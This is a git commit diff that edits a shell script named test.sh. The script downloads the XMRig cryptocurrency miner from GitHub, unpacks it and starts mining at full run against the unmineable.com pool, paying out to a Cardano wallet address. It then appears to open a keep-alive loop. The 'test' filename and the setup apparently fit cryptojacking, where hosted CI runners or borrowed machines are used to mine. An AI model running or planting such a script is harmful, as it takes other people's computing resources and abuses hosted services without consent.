178cd94a18c0facaefc3b59c28f4eb42a03771b1
daw232 <94403584+daw232@users.noreply.github.com>
2021-11-15 15:13:20 -0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -2,7 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
-tar xf xmrig-6.15.3-linux-static-x64.tar.gz
+tar xf xmrig-6.15.3-linux-x64.tar.gz
 cd xmrig-6.15.3
 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ADA:addr1q9ta8re6h2x83xa25jaz599sue858yqqhenxg2xku6qlghqzumqg5vp8v9mfzcv3vtgcxynwg3t7wjru33qerfmwsfuq8lkwxs.k61-6h9x -p x --cpu 4
 while [ 1 ]; do
